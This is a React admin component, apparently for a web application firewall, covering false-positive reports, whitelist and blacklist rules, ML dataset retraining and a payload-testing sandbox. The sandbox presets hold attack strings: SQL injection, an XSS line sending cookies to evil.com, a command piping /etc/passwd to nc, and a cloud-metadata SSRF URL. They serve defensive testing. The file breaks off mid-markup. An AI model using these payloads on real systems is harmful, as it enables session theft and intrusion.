import { useState, useEffect } from 'react'
import api from '../api/api'
import adminStore from '../utils/adminStore'

export default function AttackLearning() {
  const cachedStats = adminStore.get('learning_stats')
  const [stats, setStats] = useState(cachedStats)
  const [loading, setLoading] = useState(!cachedStats)
  const [activeTab, setActiveTab] = useState('reports') // 'reports' | 'sandbox' | 'dataset' | 'whitelists'

  // Reports state
  const [reports, setReports] = useState([])
  const [reportsFilter, setReportsFilter] = useState('all')
  const [reportsSearch, setReportsSearch] = useState('')
  const [reportsLoading, setReportsLoading] = useState(false)

  // Dataset state
  const [samples, setSamples] = useState([])
  const [samplesFilter, setSamplesFilter] = useState('all')
  const [samplesSearch, setSamplesSearch] = useState('')
  const [samplesLoading, setSamplesLoading] = useState(false)

  // Whitelists state
  const [whitelists, setWhitelists] = useState([])
  const [whitelistsLoading, setWhitelistsLoading] = useState(false)

  // Sandbox state
  const [sandboxPayload, setSandboxPayload] = useState("UNION SELECT 1, @@version, user() --")
  const [sandboxUrl, setSandboxUrl] = useState("/products?id=1")
  const [sandboxMethod, setSandboxMethod] = useState("GET")
  const [sandboxTesting, setSandboxTesting] = useState(false)
  const [sandboxResult, setSandboxResult] = useState(null)

  // Modals & Action States
  const [selectedReport, setSelectedReport] = useState(null)
  const [whitelistModalOpen, setWhitelistModalOpen] = useState(false)
  const [whitelistForm, setWhitelistForm] = useState({ name: '', pattern: '', match_type: 'contains', description: '', target_payload: '' })

  const [blacklistModalOpen, setBlacklistModalOpen] = useState(false)
  const [blacklistForm, setBlacklistForm] = useState({ name: '', pattern: '', category: 'SQL Injection', severity: 'critical', action: 'block', target_payload: '' })

  const [addSampleModalOpen, setAddSampleModalOpen] = useState(false)
  const [sampleForm, setSampleForm] = useState({ payload: '', label: 1, category: 'SQL Injection', notes: '' })

  const [retraining, setRetraining] = useState(false)
  const [notification, setNotification] = useState(null)

  const showNotification = (msg, type = 'success') => {
    setNotification({ msg, type })
    setTimeout(() => setNotification(null), 4500)
  }

  // Fetch metrics & initial tab data
  const loadStats = async (showLoading = false) => {
    if (showLoading) setLoading(true)
    try {
      const res = await api.adminGetLearningStats()
      if (res.data) {
        setStats(res.data)
        adminStore.set('learning_stats', res.data)
      }
    } catch (err) {
      console.error("Failed to load learning stats:", err)
    } finally {
      setLoading(false)
    }
  }

  const loadReports = async () => {
    setReportsLoading(true)
    try {
      const params = {}
      if (reportsFilter !== 'all') params.status = reportsFilter
      if (reportsSearch) params.q = reportsSearch
      const res = await api.adminGetLearningReports(params)
      setReports(res.data?.reports || [])
    } catch (err) {
      showNotification("Failed to fetch reports", "error")
    } finally {
      setReportsLoading(false)
    }
  }

  const loadSamples = async () => {
    setSamplesLoading(true)
    try {
      const params = {}
      if (samplesFilter !== 'all') params.label = samplesFilter
      if (samplesSearch) params.q = samplesSearch
      const res = await api.adminGetLearnedSamples(params)
      setSamples(res.data?.samples || [])
    } catch (err) {
      showNotification("Failed to fetch dataset samples", "error")
    } finally {
      setSamplesLoading(false)
    }
  }

  const loadWhitelists = async () => {
    setWhitelistsLoading(true)
    try {
      const res = await api.adminGetWhitelists()
      setWhitelists(res.data?.whitelists || [])
    } catch (err) {
      showNotification("Failed to fetch whitelists", "error")
    } finally {
      setWhitelistsLoading(false)
    }
  }

  useEffect(() => {
    loadStats(!adminStore.get('learning_stats'))
  }, [])

  useEffect(() => {
    if (activeTab === 'reports') loadReports()
    if (activeTab === 'dataset') loadSamples()
    if (activeTab === 'whitelists') loadWhitelists()
  }, [activeTab, reportsFilter, samplesFilter])

  // ==================== ACTIONS ====================

  const handleOpenWhitelistModal = (report = null, defaultPattern = '') => {
    setSelectedReport(report)
    setWhitelistForm({
      report_id: report?.id || null,
      name: report ? `WL: ${report.reference_id}` : 'Custom Whitelist Rule',
      pattern: defaultPattern || report?.payload || report?.url || '',
      match_type: report?.payload ? 'contains' : 'url_path',
      description: report ? `Whitelisted from user report ${report.reference_id}` : '',
      target_payload: report?.payload || defaultPattern || '',
    })
    setWhitelistModalOpen(true)
  }

  const handleWhitelistSubmit = async (e) => {
    e.preventDefault()
    try {
      await api.adminWhitelistPattern(whitelistForm)
      showNotification("Pattern whitelisted & benign ML sample recorded successfully! False-positive 403 resolved.")
      setWhitelistModalOpen(false)
      loadStats()
      if (activeTab === 'reports') loadReports()
      if (activeTab === 'whitelists') loadWhitelists()
    } catch (err) {
      showNotification(err.message || "Failed to whitelist pattern", "error")
    }
  }

  const handleOpenBlacklistModal = (report = null, defaultPayload = '') => {
    setSelectedReport(report)
    setBlacklistForm({
      report_id: report?.id || null,
      name: report ? `Attack Rule: ${report.reference_id}` : 'Learned Attack Signature',
      pattern: defaultPayload || report?.payload || '',
      category: report?.attack_type || 'SQL Injection',
      severity: 'critical',
      action: 'block',
      target_payload: report?.payload || defaultPayload || '',
    })
    setBlacklistModalOpen(true)
  }

  const handleBlacklistSubmit = async (e) => {
    e.preventDefault()
    try {
      await api.adminBlacklistAndLearn(blacklistForm)
      showNotification("Attack pattern blacklisted & labeled for ML continuous training!")
      setBlacklistModalOpen(false)
      loadStats()
      if (activeTab === 'reports') loadReports()
      if (activeTab === 'dataset') loadSamples()
    } catch (err) {
      showNotification(err.message || "Failed to blacklist pattern", "error")
    }
  }

  const handleDeleteReport = async (reportId) => {
    if (!window.confirm("Dismiss and delete this report?")) return
    try {
      await api.adminDismissReport(reportId)
      showNotification("Report dismissed")
      loadReports()
      loadStats()
    } catch (err) {
      showNotification("Failed to dismiss report", "error")
    }
  }

  const handleRunSandbox = async (e) => {
    if (e) e.preventDefault()
    if (!sandboxPayload.trim()) return
    setSandboxTesting(true)
    try {
      const res = await api.adminRunSandboxTest({
        payload: sandboxPayload,
        url_path: sandboxUrl,
        method: sandboxMethod,
      })
      setSandboxResult(res.data)
    } catch (err) {
      showNotification("Sandbox evaluation failed: " + err.message, "error")
    } finally {
      setSandboxTesting(false)
    }
  }

  const handleRetrainModel = async () => {
    if (!window.confirm("Trigger incremental WAF ML model fine-tuning with all learned dataset samples?")) return
    setRetraining(true)
    try {
      const res = await api.adminRetrainWafModel()
      showNotification(res.message || `WAF ML Model updated to v${res.data?.new_version}!`)
      loadStats()
      if (activeTab === 'dataset') loadSamples()
    } catch (err) {
      showNotification(err.message || "Retraining failed", "error")
    } finally {
      setRetraining(false)
    }
  }

  const handleAddSampleSubmit = async (e) => {
    e.preventDefault()
    try {
      await api.adminAddLearnedSample(sampleForm)
      showNotification("Sample added to active dataset")
      setAddSampleModalOpen(false)
      setSampleForm({ payload: '', label: 1, category: 'SQL Injection', notes: '' })
      loadSamples()
      loadStats()
    } catch (err) {
      showNotification(err.message || "Failed to add sample", "error")
    }
  }

  const handleDeleteSample = async (id) => {
    if (!window.confirm("Delete this sample from the training dataset?")) return
    try {
      await api.adminDeleteLearnedSample(id)
      showNotification("Sample removed from dataset")
      loadSamples()
      loadStats()
    } catch (err) {
      showNotification("Failed to delete sample", "error")
    }
  }

  const handleDeleteWhitelist = async (id) => {
    if (!window.confirm("Remove this whitelist rule?")) return
    try {
      await api.adminDeleteWhitelist(id)
      showNotification("Whitelist rule deleted")
      loadWhitelists()
      loadStats()
    } catch (err) {
      showNotification("Failed to delete whitelist rule", "error")
    }
  }

  const sendToSandbox = (payload, url = '/') => {
    setSandboxPayload(payload)
    setSandboxUrl(url)
    setActiveTab('sandbox')
    setTimeout(() => {
      handleRunSandbox()
    }, 150)
  }

  return (
    <>
      {/* Floating Notification */}
      {notification && (
        <div style={{
          position: 'fixed',
          top: '24px',
          right: '24px',
          zIndex: 9999,
          background: notification.type === 'error' ? '#ef4444' : '#10b981',
          color: '#ffffff',
          padding: '12px 20px',
          borderRadius: '8px',
          boxShadow: '0 8px 24px rgba(0,0,0,0.15)',
          fontWeight: '600',
          display: 'flex',
          alignItems: 'center',
          gap: '10px'
        }}>
          <i className={`fas ${notification.type === 'error' ? 'fa-circle-exclamation' : 'fa-circle-check'}`}></i>
          {notification.msg}
        </div>
      )}

      {/* Header Bar */}
      <div style={{
        background: 'white',
        borderRadius: '12px',
        border: '1px solid #e2e8f0',
        padding: '16px 20px',
        marginBottom: '20px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        flexWrap: 'wrap',
        gap: '14px',
        boxShadow: '0 1px 3px rgba(0,0,0,0.03)'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
          <div style={{
            width: '42px',
            height: '42px',
            borderRadius: '10px',
            background: 'linear-gradient(135deg, #f3e8ff, #e9d5ff)',
            color: '#7c3aed',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '19px'
          }}>
            <i className="fas fa-brain"></i>
          </div>
          <div>
            <h1 style={{ fontSize: '16px', fontWeight: '700', color: '#0f172a', margin: 0 }}>
              Attack Learning Lab & AI Model Center
            </h1>
            <p style={{ color: '#64748b', fontSize: '12.5px', margin: '3px 0 0' }}>
              Resolve 403 false positives via 1-click whitelisting, capture emerging threat signatures, and fine-tune ML models.
            </p>
          </div>
        </div>

        <div style={{ display: 'flex', gap: '10px' }}>
          <button
            type="button"
            className="btn-primary"
            onClick={handleRetrainModel}
            disabled={retraining}
            style={{
              padding: '8px 18px',
              fontSize: '12.5px',
              fontWeight: '600',
              display: 'inline-flex',
              alignItems: 'center',
              gap: '6px',
              background: '#7c3aed'
            }}
          >
            <i className={`fas fa-rotate ${retraining ? 'fa-spin' : ''}`}></i>
            {retraining ? 'Fine-Tuning ML Model...' : 'Retrain WAF Model Now'}
          </button>
        </div>
      </div>

      {/* Stat Cards Grid */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '16px', marginBottom: '20px' }}>
        <div style={{ background: 'white', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '16px 20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
          <div style={{ fontSize: '12px', fontWeight: '700', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
            Pending User Reports
          </div>
          <div style={{ fontSize: '26px', fontWeight: '800', color: '#d97706', margin: '4px 0' }}>
            {stats?.reports?.pending || 0}
          </div>
          <div style={{ fontSize: '12px', color: '#94a3b8' }}>Total Feedback: {stats?.reports?.total || 0}</div>
        </div>

        <div style={{ background: 'white', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '16px 20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
          <div style={{ fontSize: '12px', fontWeight: '700', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
            Learned Attack Rules
          </div>
          <div style={{ fontSize: '26px', fontWeight: '800', color: '#dc2626', margin: '4px 0' }}>
            {stats?.rules?.learned_blocking_rules || 0}
          </div>
          <div style={{ fontSize: '12px', color: '#94a3b8' }}>Dynamic Signature Blocks</div>
        </div>

        <div style={{ background: 'white', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '16px 20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
          <div style={{ fontSize: '12px', fontWeight: '700', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
            Active Whitelists (Fix 403)
          </div>
          <div style={{ fontSize: '26px', fontWeight: '800', color: '#16a34a', margin: '4px 0' }}>
            {stats?.rules?.active_whitelists || 0}
          </div>
          <div style={{ fontSize: '12px', color: '#94a3b8' }}>Safe Route Exceptions</div>
        </div>

        <div style={{ background: 'white', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '16px 20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
          <div style={{ fontSize: '12px', fontWeight: '700', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
            WAF ML Model Version
          </div>
          <div style={{ fontSize: '26px', fontWeight: '800', color: '#7c3aed', margin: '4px 0' }}>
            v{stats?.model_status?.model_version || '2.4.0'}
          </div>
          <div style={{ fontSize: '12px', color: '#94a3b8' }}>
            {stats?.dataset?.untrained_samples || 0} queued samples ready
          </div>
        </div>
      </div>

      {/* Interactive 4-Section Architecture & Workflow Guide */}
      <div style={{
        background: 'linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%)',
        border: '1px solid #e2e8f0',
        borderRadius: '12px',
        padding: '16px 20px',
        marginBottom: '20px',
        boxShadow: '0 1px 3px rgba(0,0,0,0.02)'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '12px', flexWrap: 'wrap', gap: '8px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <i className="fas fa-lightbulb" style={{ color: '#d97706', fontSize: '16px' }}></i>
            <h4 style={{ margin: 0, fontSize: '14px', fontWeight: '700', color: '#0f172a' }}>
              How the 4 Attack Learning Modules Work Together
            </h4>
          </div>
          <span style={{ fontSize: '12px', color: '#64748b' }}>Continuous Adaptive Security Loop</span>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '12px' }}>
          <div
            onClick={() => setActiveTab('reports')}
            style={{
              background: activeTab === 'reports' ? '#eff6ff' : 'white',
              border: '1px solid ' + (activeTab === 'reports' ? '#93c5fd' : '#e2e8f0'),
              borderRadius: '8px',
              padding: '12px 14px',
              cursor: 'pointer',
              transition: 'all 0.15s'
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '4px' }}>
              <span style={{ width: '20px', height: '20px', borderRadius: '50%', background: '#dbeafe', color: '#2563eb', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '11px', fontWeight: '800' }}>1</span>
              <strong style={{ fontSize: '13px', color: '#1e40af' }}>False-Positive Inbox</strong>
            </div>
            <p style={{ margin: 0, fontSize: '11.5px', color: '#475569', lineHeight: '1.4' }}>
              When a user reports a blocked legitimate request (403), review and click <strong>1-Click Whitelist</strong> to instantly fix it.
            </p>
          </div>

          <div
            onClick={() => setActiveTab('sandbox')}
            style={{
              background: activeTab === 'sandbox' ? '#faf5ff' : 'white',
              border: '1px solid ' + (activeTab === 'sandbox' ? '#d8b4fe' : '#e2e8f0'),
              borderRadius: '8px',
              padding: '12px 14px',
              cursor: 'pointer',
              transition: 'all 0.15s'
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '4px' }}>
              <span style={{ width: '20px', height: '20px', borderRadius: '50%', background: '#f3e8ff', color: '#7c3aed', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '11px', fontWeight: '800' }}>2</span>
              <strong style={{ fontSize: '13px', color: '#6b21a8' }}>Interactive Sandbox</strong>
            </div>
            <p style={{ margin: 0, fontSize: '11.5px', color: '#475569', lineHeight: '1.4' }}>
              Test any suspicious URL, query, or SQLi/XSS payload live to inspect AST, Regex, and Neural ML scores.
            </p>
          </div>

          <div
            onClick={() => setActiveTab('dataset')}
            style={{
              background: activeTab === 'dataset' ? '#f0fdf4' : 'white',
              border: '1px solid ' + (activeTab === 'dataset' ? '#86efac' : '#e2e8f0'),
              borderRadius: '8px',
              padding: '12px 14px',
              cursor: 'pointer',
              transition: 'all 0.15s'
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '4px' }}>
              <span style={{ width: '20px', height: '20px', borderRadius: '50%', background: '#dcfce7', color: '#16a34a', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '11px', fontWeight: '800' }}>3</span>
              <strong style={{ fontSize: '13px', color: '#15803d' }}>ML Active Dataset</strong>
            </div>
            <p style={{ margin: 0, fontSize: '11.5px', color: '#475569', lineHeight: '1.4' }}>
              Stores labeled Safe (0) vs Attack (1) samples. Click <strong>Retrain Model Now</strong> to continuously fine-tune the AI.
            </p>
          </div>

          <div
            onClick={() => setActiveTab('whitelists')}
            style={{
              background: activeTab === 'whitelists' ? '#fff7ed' : 'white',
              border: '1px solid ' + (activeTab === 'whitelists' ? '#fed7aa' : '#e2e8f0'),
              borderRadius: '8px',
              padding: '12px 14px',
              cursor: 'pointer',
              transition: 'all 0.15s'
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '4px' }}>
              <span style={{ width: '20px', height: '20px', borderRadius: '50%', background: '#ffedd5', color: '#c2410c', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '11px', fontWeight: '800' }}>4</span>
              <strong style={{ fontSize: '13px', color: '#9a3412' }}>Active Whitelist Rules</strong>
            </div>
            <p style={{ margin: 0, fontSize: '11.5px', color: '#475569', lineHeight: '1.4' }}>
              Permanent exception rules (paths, APIs, webhooks) that are guaranteed never to trigger a 403 block.
            </p>
          </div>
        </div>
      </div>

      {/* Tabs Navigation */}
      <div style={{
        background: 'white',
        borderRadius: '12px',
        border: '1px solid #e2e8f0',
        padding: '6px',
        marginBottom: '20px',
        display: 'flex',
        gap: '6px',
        flexWrap: 'wrap',
        boxShadow: '0 1px 3px rgba(0,0,0,0.03)'
      }}>
        {[
          { id: 'reports', label: 'User Reports & Feedback', icon: 'fa-inbox', badge: stats?.reports?.pending },
          { id: 'sandbox', label: 'Interactive Attack Sandbox', icon: 'fa-flask' },
          { id: 'dataset', label: `ML Training Dataset (${stats?.dataset?.total_samples || 0})`, icon: 'fa-database' },
          { id: 'whitelists', label: `Whitelist Rules (${stats?.rules?.active_whitelists || 0})`, icon: 'fa-shield-heart' }
        ].map(tab => (
          <button
            key={tab.id}
            type="button"
            onClick={() => setActiveTab(tab.id)}
            style={{
              padding: '9px 16px',
              borderRadius: '8px',
              border: 'none',
              background: activeTab === tab.id ? '#7c3aed' : 'transparent',
              color: activeTab === tab.id ? 'white' : '#64748b',
              fontWeight: '600',
              fontSize: '13px',
              cursor: 'pointer',
              display: 'inline-flex',
              alignItems: 'center',
              gap: '8px',
              transition: 'all 0.15s'
            }}
          >
            <i className={`fas ${tab.icon}`}></i>
            {tab.label}
            {tab.badge > 0 && (
              <span style={{
                background: activeTab === tab.id ? 'white' : '#d97706',
                color: activeTab === tab.id ? '#7c3aed' : 'white',
                padding: '1px 6px',
                borderRadius: '10px',
                fontSize: '11px',
                fontWeight: '700'
              }}>
                {tab.badge}
              </span>
            )}
          </button>
        ))}
      </div>

      {/* ==================== TAB 1: REPORTS & FEEDBACK ==================== */}
      {activeTab === 'reports' && (
        <div style={{ background: 'white', borderRadius: '12px', border: '1px solid #e2e8f0', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
          {/* Controls Bar */}
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px', gap: '14px', flexWrap: 'wrap' }}>
            <div style={{ display: 'flex', gap: '8px' }}>
              {['all', 'pending', 'whitelisted', 'blacklisted'].map(st => (
                <button
                  key={st}
                  onClick={() => setReportsFilter(st)}
                  style={{
                    padding: '6px 14px',
                    borderRadius: '8px',
                    border: '1px solid ' + (reportsFilter === st ? '#7c3aed' : '#e2e8f0'),
                    background: reportsFilter === st ? '#f5f3ff' : '#f8fafc',
                    color: reportsFilter === st ? '#7c3aed' : '#475569',
                    fontWeight: '600',
                    fontSize: '12.5px',
                    cursor: 'pointer',
                    textTransform: 'capitalize'
                  }}
                >
                  {st}
                </button>
              ))}
            </div>

            <div style={{ display: 'flex', gap: '8px', flex: '1 1 280px', maxWidth: '400px' }}>
              <input
                type="text"
                placeholder="Search reference, IP, URL, payload..."
                value={reportsSearch}
                onChange={e => setReportsSearch(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && loadReports()}
                style={{ width: '100%', padding: '8px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
              />
              <button
                type="button"
                onClick={loadReports}
                style={{ padding: '8px 14px', borderRadius: '8px', background: '#f8fafc', border: '1px solid #e2e8f0', color: '#475569', cursor: 'pointer' }}
              >
                <i className="fas fa-search"></i>
              </button>
            </div>
          </div>

          {/* Reports List */}
          {reportsLoading ? (
            <div style={{ textAlign: 'center', padding: '50px', color: '#94a3b8' }}>
              <i className="fas fa-spinner fa-spin fa-2x"></i>
              <p style={{ marginTop: '10px', fontSize: '13px' }}>Loading reports...</p>
            </div>
          ) : reports.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '50px 20px', background: '#f8fafc', borderRadius: '10px', border: '1px dashed #cbd5e1' }}>
              <i className="fas fa-shield-check fa-3x" style={{ color: '#16a34a', marginBottom: '12px' }}></i>
              <h3 style={{ margin: '0 0 6px', color: '#0f172a', fontSize: '16px' }}>No Reports in Queue</h3>
              <p style={{ color: '#64748b', fontSize: '13px', margin: 0 }}>All user feedback and false positive requests have been reviewed.</p>
            </div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
              {reports.map(r => (
                <div key={r.id} style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '10px', padding: '16px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '10px' }}>
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
                        <span style={{
                          padding: '3px 8px',
                          borderRadius: '12px',
                          fontSize: '11px',
                          fontWeight: '700',
                          textTransform: 'uppercase',
                          background: r.status === 'pending' ? '#fef3c7' : r.status === 'whitelisted' ? '#dcfce7' : '#fee2e2',
                          color: r.status === 'pending' ? '#b45309' : r.status === 'whitelisted' ? '#16a34a' : '#dc2626'
                        }}>
                          {r.status}
                        </span>
                        <strong style={{ fontSize: '14px', color: '#0f172a' }}>REF: {r.reference_id}</strong>
                        <span style={{ fontSize: '12.5px', color: '#64748b' }}>Client IP: <code style={{ color: '#0f172a' }}>{r.client_ip}</code></span>
                        <span style={{ fontSize: '12.5px', color: '#64748b' }}>User: {r.user_email || 'Anonymous'}</span>
                      </div>
                      <div style={{ fontSize: '12.5px', color: '#475569', marginTop: '6px' }}>
                        <strong>Target Path:</strong> <code>{r.url}</code> &bull; <strong>Triggered:</strong> <span style={{ color: '#dc2626' }}>{r.reason || r.attack_type}</span>
                      </div>
                    </div>

                    <div style={{ fontSize: '12px', color: '#94a3b8' }}>
                      {r.created_at?.slice(0, 19)}
                    </div>
                  </div>

                  {r.comments && (
                    <div style={{ marginTop: '10px', fontSize: '12.5px', padding: '8px 12px', background: '#eff6ff', borderRadius: '6px', borderLeft: '3px solid #3b82f6', color: '#1e3a8a' }}>
                      <strong>User Note:</strong> {r.comments}
                    </div>
                  )}

                  {r.payload && (
                    <div style={{ marginTop: '10px' }}>
                      <div style={{ fontSize: '11.5px', fontWeight: '700', color: '#64748b' }}>REPORTED BLOCKED PAYLOAD / QUERY:</div>
                      <div style={{ fontFamily: 'monospace', fontSize: '12px', padding: '8px 12px', background: '#ffffff', borderRadius: '6px', border: '1px solid #e2e8f0', color: '#0284c7', wordBreak: 'break-all', marginTop: '4px' }}>
                        {r.payload}
                      </div>
                    </div>
                  )}

                  {/* 1-Click Action Hub */}
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '12px', paddingTop: '12px', borderTop: '1px solid #e2e8f0', flexWrap: 'wrap', gap: '8px' }}>
                    <div style={{ display: 'flex', gap: '8px' }}>
                      <button
                        onClick={() => handleOpenWhitelistModal(r)}
                        style={{ padding: '6px 12px', borderRadius: '6px', background: '#16a34a', color: 'white', border: 'none', fontSize: '12px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
                      >
                        <i className="fas fa-shield-heart"></i> 1-Click Whitelist (Fix 403)
                      </button>
                      <button
                        onClick={() => handleOpenBlacklistModal(r)}
                        style={{ padding: '6px 12px', borderRadius: '6px', background: '#dc2626', color: 'white', border: 'none', fontSize: '12px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
                      >
                        <i className="fas fa-ban"></i> Blacklist as Attack & Learn
                      </button>
                      <button
                        onClick={() => sendToSandbox(r.payload || r.url, r.url)}
                        style={{ padding: '6px 12px', borderRadius: '6px', background: '#ffffff', border: '1px solid #cbd5e1', color: '#475569', fontSize: '12px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
                      >
                        <i className="fas fa-flask"></i> Test in Sandbox
                      </button>
                    </div>

                    <button
                      onClick={() => handleDeleteReport(r.id)}
                      style={{ padding: '6px 10px', borderRadius: '6px', background: '#fee2e2', border: '1px solid #fecdd3', color: '#dc2626', fontSize: '12px', fontWeight: '600', cursor: 'pointer' }}
                    >
                      <i className="fas fa-trash"></i> Dismiss
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* ==================== TAB 2: INTERACTIVE SANDBOX ==================== */}
      {activeTab === 'sandbox' && (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))', gap: '20px' }}>
          {/* Input Form */}
          <div style={{ background: 'white', borderRadius: '12px', border: '1px solid #e2e8f0', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '14px' }}>
              <i className="fas fa-flask" style={{ color: '#7c3aed', fontSize: '20px' }}></i>
              <h3 style={{ margin: 0, fontSize: '16px', color: '#0f172a' }}>Live Attack Sandbox & Payload Evaluator</h3>
            </div>
            <p style={{ fontSize: '12.5px', color: '#64748b', marginBottom: '16px' }}>
              Simulate live WAF inspection across Semantic AST, 2,000+ Regex Signatures, and ML Neural Classifier.
            </p>

            <form onSubmit={handleRunSandbox}>
              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>
                  Request Path
                </label>
                <input
                  type="text"
                  value={sandboxUrl}
                  onChange={e => setSandboxUrl(e.target.value)}
                  placeholder="/api/v1/search?q="
                  style={{ width: '100%', padding: '8px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
                />
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>
                  Raw Payload / Body
                </label>
                <textarea
                  rows={4}
                  value={sandboxPayload}
                  onChange={e => setSandboxPayload(e.target.value)}
                  required
                  placeholder="Enter suspicious string or SQLi/XSS/RCE/SSRF payload..."
                  style={{ width: '100%', padding: '8px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', fontFamily: 'monospace' }}
                />
              </div>

              <button
                type="submit"
                disabled={sandboxTesting}
                style={{
                  width: '100%',
                  padding: '10px',
                  borderRadius: '8px',
                  background: '#7c3aed',
                  color: 'white',
                  border: 'none',
                  fontSize: '13px',
                  fontWeight: '600',
                  cursor: 'pointer',
                  display: 'inline-flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '6px'
                }}
              >
                <i className={`fas fa-bolt ${sandboxTesting ? 'fa-spin' : ''}`}></i>
                {sandboxTesting ? 'Evaluating with Neural & Rule Engine...' : 'Inspect & Analyze Payload'}
              </button>
            </form>

            {/* Quick Test Samples */}
            <div style={{ marginTop: '20px', paddingTop: '14px', borderTop: '1px solid #e2e8f0' }}>
              <div style={{ fontSize: '11.5px', fontWeight: '700', color: '#64748b', marginBottom: '8px' }}>QUICK PRESETS:</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
                {[
                  { name: 'SQLi Union', p: "' UNION SELECT null, version(), user() --" },
                  { name: 'XSS Cookie Leak', p: "<img src=x onerror=fetch('http://evil.com/leak?c='+document.cookie)>" },
                  { name: 'RCE Shell', p: "; cat /etc/passwd | nc 10.0.0.1 4444" },
                  { name: 'SSRF Cloud', p: "http://169.254.169.254/latest/meta-data/" },
                  { name: 'Benign Search', p: "search=latest+news+updates" }
                ].map(ex => (
                  <button
                    key={ex.name}
                    type="button"
                    onClick={() => { setSandboxPayload(ex.p); setTimeout(handleRunSandbox, 50) }}
                    style={{ padding: '4px 10px', borderRadius: '6px', background: '#f8fafc', border: '1px solid #cbd5e1', color: '#334155', fontSize: '11.5px', fontWeight: '500', cursor: 'pointer' }}
                  >
                    {ex.name}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Results Display */}
          <div style={{ background: 'white', borderRadius: '12px', border: '1px solid #e2e8f0', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
            <h3 style={{ margin: '0 0 14px 0', fontSize: '16px', color: '#0f172a' }}>Multi-Engine Telemetry Breakdown</h3>

            {!sandboxResult ? (
              <div style={{ textAlign: 'center', padding: '60px 20px', color: '#94a3b8' }}>
                <i className="fas fa-microscope fa-3x" style={{ opacity: 0.4, marginBottom: '12px' }}></i>
                <p style={{ fontSize: '13px' }}>Run analysis to inspect the ML confidence score, Semantic AST, and Rule matching.</p>
              </div>
            ) : (
              <div>
                {/* Decision Banner */}
                <div style={{
                  padding: '16px',
                  borderRadius: '10px',
                  marginBottom: '16px',
                  background: sandboxResult.decision === 'BLOCK' ? '#fee2e2' : '#dcfce7',
                  border: `1px solid ${sandboxResult.decision === 'BLOCK' ? '#fca5a5' : '#86efac'}`,
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center'
                }}>
                  <div>
                    <span style={{ fontSize: '11px', fontWeight: '800', textTransform: 'uppercase', color: sandboxResult.decision === 'BLOCK' ? '#dc2626' : '#16a34a' }}>
                      DECISION: {sandboxResult.decision} (HTTP {sandboxResult.decision === 'BLOCK' ? '403' : '200'})
                    </span>
                    <h3 style={{ margin: '4px 0 0 0', fontSize: '15px', color: '#0f172a' }}>{sandboxResult.reason}</h3>
                  </div>
                  <div style={{ textAlign: 'right' }}>
